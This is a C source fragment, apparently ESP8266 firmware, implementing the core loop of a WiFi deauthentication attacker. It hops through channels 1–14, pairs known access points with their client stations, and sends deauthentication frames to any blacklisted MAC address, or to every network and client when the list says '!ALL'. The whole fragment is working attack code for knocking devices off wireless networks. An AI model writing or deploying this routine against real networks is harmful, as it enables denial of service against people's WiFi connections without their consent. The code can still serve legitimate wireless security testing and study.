void madWifi_worker()
{
    channel++;
    if (channel == 15) 
    {
        channel = 1;
    }

    //Serial.printf("Switching Channel: %d\n",channel);
    wifi_set_channel(channel);

    char station[32];
    char ap[32];
    for (int ua = 0; ua < aps_known_count; ua++)
    {
        if (aps_known[ua].channel == channel)
        {
            for (int uc = 0; uc < clients_known_count; uc++)
            {
                if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN))
                {

                    station[0] = 0x00;
                    sprintf(station,"%02X%02X%02X%02X%02X%02X",clients_known[uc].station[0],clients_known[uc].station[1],clients_known[uc].station[2],clients_known[uc].station[3],clients_known[uc].station[4],clients_known[uc].station[5]);

                    ap[0] = 0x00;
                    sprintf(ap,"%02X%02X%02X%02X%02X%02X",aps_known[ua].bssid[0],aps_known[ua].bssid[1],aps_known[ua].bssid[2],aps_known[ua].bssid[3],aps_known[ua].bssid[4],aps_known[ua].bssid[5]);


                    if(Blacklist.indexOf(" " + String(ap)) >= 0 || Blacklist.indexOf(" !ALL") >= 0)
                    {
                        Serial.printf("AP Deauth: %s ( %s )\n",ap,aps_known[ua].ssid);
                        deauth(broadcast2, aps_known[ua].bssid, 128);
                        deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                        //make_beacon("",(char*)aps_known[ua].ssid,channel);
                        led1_blink(50);
                    }
                    else if(Blacklist.indexOf(" " + String(station)) >= 0 || Blacklist.indexOf(" !ALL") >= 0)
                    {
                        Serial.printf("Station Deauth: %s -> %s\n",station,aps_known[ua].ssid);
                        deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                        //make_beacon("",(char*)aps_known[ua].ssid,channel);
                        led1_blink(50);
                    }

                    //Serial.printf("Skip: %s <> %s\n",station,ap);
                    //break;
                }
            }
        }
    }

    /*
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
    */
}
